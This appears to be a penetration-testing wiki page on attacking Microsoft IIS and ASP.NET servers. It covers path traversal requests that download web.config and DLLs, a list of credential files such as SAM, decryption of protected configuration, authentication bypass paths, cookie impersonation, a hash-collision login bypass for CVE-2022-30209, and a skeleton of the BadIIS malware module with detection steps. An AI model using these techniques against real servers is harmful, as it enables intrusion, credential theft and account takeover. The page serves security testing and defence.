# IIS - Internet Information Services

{{#include ../../banners/hacktricks-training.md}}

Test executable file extensions:

- asp
- aspx
- config
- php

## Internal IP Address disclosure

On any IIS server where you get a 302 you can try stripping the Host header and using HTTP/1.0 and inside the response the Location header could point you to the internal IP address:

```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```

Response disclosing the internal IP:

```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```

## Execute .config files

You can upload .config files and use them to execute code. One way to do it is appending the code at the end of the file inside an HTML comment: [Download example here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

More information and techniques to exploit this vulnerability [here](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Discovery Bruteforce

Download the list that I have created:

{{#file}}
iisfinal.txt
{{#endfile}}

It was created merging the contents of the following lists:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Use it without adding any extension, the files that need it have it already.

## Path Traversal

### Leaking source code

Check the full writeup in: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

> [!TIP]
> As summary, there are several web.config files inside the folders of the application with references to "**assemblyIdentity**" files and "**namespaces**". With this information it's possible to know **where are executables located** and download them.\
> From the **downloaded Dlls** it's also possible to find **new namespaces** where you should try to access and get the web.config file in order to find new namespaces and assemblyIdentity.\
> Also, the files **connectionstrings.config** and **global.asax** may contain interesting information.

In **.Net MVC applications**, the **web.config** file plays a crucial role by specifying each binary file the application relies on through **"assemblyIdentity"** XML tags.

### **Exploring Binary Files**

An example of accessing the **web.config** file is shown below:

```html
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```

This request reveals various settings and dependencies, such as:

- **EntityFramework** version
- **AppSettings** for webpages, client validation, and JavaScript
- **System.web** configurations for authentication and runtime
- **System.webServer** modules settings
- **Runtime** assembly bindings for numerous libraries like **Microsoft.Owin**, **Newtonsoft.Json**, and **System.Web.Mvc**

These settings indicate that certain files, such as **/bin/WebGrease.dll**, are located within the application's /bin folder.

### **Root Directory Files**

Files found in the root directory, like **/global.asax** and **/connectionstrings.config** (which contains sensitive passwords), are essential for the application's configuration and operation.

### **Namespaces and Web.Config**

MVC applications also define additional **web.config files** for specific namespaces to avoid repetitive declarations in each file, as demonstrated with a request to download another **web.config**:

```html
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```

### **Downloading DLLs**

The mention of a custom namespace hints at a DLL named "**WebApplication1**" present in the /bin directory. Following this, a request to download the **WebApplication1.dll** is shown:

```html
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```

This suggests the presence of other essential DLLs, like **System.Web.Mvc.dll** and **System.Web.Optimization.dll**, in the /bin directory.

In a scenario where a DLL imports a namespace called **WebApplication1.Areas.Minded**, an attacker might infer the existence of other web.config files in predictable paths, such as **/area-name/Views/**, containing specific configurations and references to other DLLs in the /bin folder. For example, a request to **/Minded/Views/web.config** can reveal configurations and namespaces that indicate the presence of another DLL, **WebApplication1.AdditionalFeatures.dll**.

### Common files

From [here](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```

## HTTPAPI 2.0 404 Error

If you see an error like the following one:

![](<../../images/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

It means that the server **didn't receive the correct domain name** inside the Host header.\
In order to access the web page you could take a look to the served **SSL Certificate** and maybe you can find the domain/subdomain name in there. If it isn't there you may need to **brute force VHosts** until you find the correct one.

## Decrypt encrypted configuration and ASP.NET Core Data Protection key rings

Two common patterns to protect secrets on IIS-hosted .NET apps are:
- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) for web.config sections like <connectionStrings>.
- ASP.NET Core Data Protection key ring (persisted locally) used to protect application secrets and cookies.

If you have filesystem or interactive access on the web server, co-located keys often allow decryption.

- ASP.NET (Full Framework) – decrypt protected config sections with aspnet_regiis:

```cmd
# Decrypt a section by app path (site configured in IIS)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Or specify the physical path (-pef/-pdf write/read to a config file under a dir)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```

- ASP.NET Core – look for Data Protection key rings stored locally (XML/JSON files) under locations like:
  - %PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys
  - HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys (registry)
  - App-managed folder (e.g., App_Data\keys or a Keys directory next to the app)

With the key ring available, an operator running in the app’s identity can instantiate an IDataProtector with the same purposes and unprotect stored secrets. Misconfigurations that store the key ring with the app files make offline decryption trivial once the host is compromised.

## IIS/ASP.NET/PHP Module Backdoors (BadIIS) – Server-side cloaking, 404 hijacking and reverse‑proxy redirects

Malicious IIS implants frequently abuse the HTTP pipeline to cloak content from admins and scanners while manipulating what search engines and users see. A prominent family is commonly called BadIIS, observed as native IIS modules (unmanaged DLL), managed .NET modules, ASP.NET handlers, and even PHP front‑controllers on Apache/PHP sites. Key techniques:

- Server-side cloaking based on User-Agent and Referer
- 404 hijacking for crawlers and crawler-only injection on 200 OK
- Reverse-proxying/redirecting through attacker C2 infrastructure

### How IIS modules enable transparent manipulation

IIS loads native and managed modules that can subscribe to early/late pipeline events. A malicious native module typically exports RegisterModule and subscribes to OnBeginRequest and OnSendResponse to inspect and modify both requests and responses with the application’s privileges.

```c
// Native module skeleton (simplified)
HRESULT RegisterModule(DWORD, IHttpModuleRegistrationInfo* regInfo, IHttpServer* ) {
  auto* m = new ChongXieDe();          // 重写 ("rewrite")
  regInfo->SetRequestNotifications(m, RQ_BEGIN_REQUEST | RQ_SEND_RESPONSE, 0);
  return S_OK;
}

ChongXieDe::ChongXieDe() {
  cfg = xor_decrypt(blob_in_rdata);     // decrypt embedded config blob in-place
}

REQUEST_NOTIFICATION_STATUS OnBeginRequest(IN IHttpContext* ctx, IN OUT IHttpEventProvider* ) {
  // decide by UA/Referer whether to serve/proxy/redirect
}

REQUEST_NOTIFICATION_STATUS OnSendResponse(IN IHttpContext* ctx, IN OUT IHttpEventProvider* ) {
  // optionally inject spam links/iframes for crawlers only when status=200
}
```

Managed modules (C#) hook the ASP.NET integrated pipeline similarly via IHttpModule.Init and HttpApplication events (BeginRequest/PreSendRequestHeaders/EndRequest).

### Two-phase SEO poisoning workflow

- Poison the index (crawler lure): If User-Agent matches search engines (e.g., google|bing|yahoo|coccoc|viet), the module serves keyword‑stuffed HTML fetched from a C2 so crawlers index attacker content under the trusted domain.
- Redirect victims (search referer): If a human visit has a search-engine Referer, the module proxies/redirects to monetized destinations from C2, while direct visits look benign.

Common capabilities across variants:
- JavaScript/iframe/link injection for crawlers only
- 404 hijacking: on not-found requests from crawlers, return C2-supplied page (200/302)
- Reverse‑proxy tunneling: server fetches C2 content and streams it to clients
- Config decrypted on load (often XOR) from a blob embedded in the binary

### Other BadIIS-lineage variants beyond native DLL

- ASP.NET page handler: Logic lives in Page_Load; inspects HTTP_REFERER/UA to redirect cloaked traffic or proxy C2 content. Fast to deploy on compromised IIS sites.
- Managed .NET IIS module (C#): Hooks integrated pipeline, implements 404 hijacking for crawlers and "200 OK live injection" (inject spam links/keywords into response body only for crawler UAs).
- PHP front‑controller (on Apache/PHP): Implements referer/UA/URL pattern checks to decide routing. For Googlebot, often does:
  - Sitemap generator: builds a valid XML sitemap from C2-provided page list to force crawling of fake URLs.
  - Content rewriter: on crawl of those URLs, fetches an HTML template from C2 and injects URL keywords into title/headings to generate spam pages on demand. Can route mobile Google visitors to C2 for certain keyworded paths (e.g., game, video).

### Reproducing and testing (crawler-only behavior)

Because logic is server-side and conditional, normal browsing may not show anything. Test with crawler UAs and search referers:

```bash
# Request with Googlebot UA (crawler lure)
curl -i -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://target/

# Simulate user clicking from Google (redirect/proxy)
curl -i -e "https://www.google.com/search?q=site:target" http://target/some-page

# Probe 404 hijacking vs. real 404 for crawlers
curl -i -A "Googlebot" http://target/this-should-not-exist-123
```

Tip: compare responses/headers/bodies for the same URL with and without the special UA/Referer. Look for injected link farms, different status codes (200/302), or content that appears templated and keyword‑stuffed.

### Hunting and DFIR (IIS)

- Enumerate native/managed modules and unexpected DLLs:
  - appcmd (native + managed registrations):
    ```cmd
    %windir%\system32\inetsrv\appcmd list modules
    %windir%\system32\inetsrv\appcmd list config /section:modules
    %windir%\system32\inetsrv\appcmd list config "Default Web Site/" /section:system.webServer/modules
    ```
  - PowerShell (managed module entries under system.webServer/modules):
    ```powershell
    Get-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -filter "system.webServer/modules/add" -name .
    Get-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -filter "system.webServer/handlers/add" -name .
    ```
  - Inspect applicationHost.config and web.config for:
    - <system.webServer><modules><add name=... image=... /> (native)
    - <system.webServer><modules><add name=... type=... /> (managed)
    - <handlers><add ... path="*.aspx|*.php|*" type=... /> registering custom handlers
- Triage suspect binaries/assemblies:
  - Recently-dropped DLLs under site/bin or system locations; export named RegisterModule; strings mentioning OnBeginRequest/OnSendResponse; XOR-decrypt routines of an embedded blob.
  - For managed modules, look for assemblies referenced by web.config modules/handlers that implement IHttpModule.
- Web root triage:
  - Recently created ZIPs or archives of source trees placed under web‑accessible paths (for exfiltration).
  - Unexpected ASPX handlers with redirect/cloaking logic in Page_Load.
- Network:
  - Server-initiated fetches immediately re-served to clients (reverse-proxy behavior).
  - Conditional 302 vs 200 differences by UA/Referer and egress to suspicious C2 infrastructure.
- Host artifacts:
  - Creation of new local users or scheduled tasks used for persistence and lateral movement.

### Mitigations

- Remove unknown modules/handlers, restart IIS; verify applicationHost.config and site web.config files under source control.
- Lock down who can register modules/handlers and write web roots; monitor for config drift.
- Add server-side monitoring to diff crawler vs. non-crawler responses and alert on conditional cloaking patterns.

## Old IIS vulnerabilities worth looking for

### Microsoft IIS tilde character “\~” Vulnerability/Feature – Short File/Folder Name Disclosure

You can try to **enumerate folders and files** inside every discovered folder (even if it's requiring Basic Authentication) using this **technique**.\
The main limitation of this technique if the server is vulnerable is that **it can only find up to the first 6 letters of the name of each file/folder and the first 3 letters of the extension** of the files.

You can use [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) to test for this vulnerability:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../images/image (844).png>)

Original research: [https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

You can also use **metasploit**: `use scanner/http/iis_shortname_scanner`

A nice idea to **find the final name** of the discovered files is to **ask LLMs** for options like it's done in the script [https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py](https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py)

### Basic Authentication bypass

**Bypass** a basic authentication (**IIS 7.5**) trying to access: `/admin:$i30:$INDEX_ALLOCATION/admin.php` or `/admin::$INDEX_ALLOCATION/admin.php`

You can try to **mix** this **vulnerability** and the last one to find new **folders** and **bypass** the authentication.

## ASP.NET Trace.AXD enabled debugging

ASP.NET include a debugging mode and its file is called `trace.axd`.

It keeps a very detailed log of all requests made to an application over a period of time.

This information includes remote client IP's, session IDs, all request and response cookies, physical paths, source code information, and potentially even usernames and passwords.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH uses the following info:

- **`validationKey`** (string): hex-encoded key to use for signature validation.
- **`decryptionMethod`** (string): (default “AES”).
- **`decryptionIV`** (string): hex-encoded initialization vector (defaults to a vector of zeros).
- **`decryptionKey`** (string): hex-encoded key to use for decryption.

However, some people will use the **default values** of these parameters and will use as **cookie the email of the user**. Therefore, if you can find a web using the **same platform** that is using the ASPXAUTH cookie and you **create a user with the email of the user you want to impersonate** on the server under attack, you may be able to us**e the cookie from the second server in the first one** and impersonate the user.\
This attacked worked in this [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## IIS Authentication Bypass with cached passwords (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Full report here](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): A bug in the code **didn't properly check for the password given by the user**, so an attacker whose **password hash hits a key** that is already in the **cache** will be able to login as that user .

```python
# script for sanity check
> type test.py
def HashString(password):
    j = 0
    for c in map(ord, password):
        j = c + (101*j)&0xffffffff
    return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```

## References

- [Operation Rewrite: Chinese‑Speaking Threat Actors Deploy BadIIS in a Wide‑Scale SEO Poisoning Campaign (Unit 42)](https://unit42.paloaltonetworks.com/operation-rewrite-seo-poisoning-campaign/)
- [Anatomy of native IIS malware (ESET whitepaper, PDF)](https://www.welivesecurity.com/wp-content/uploads/2021/06/eset_iis_malware.pdf)

{{#include ../../banners/hacktricks-training.md}}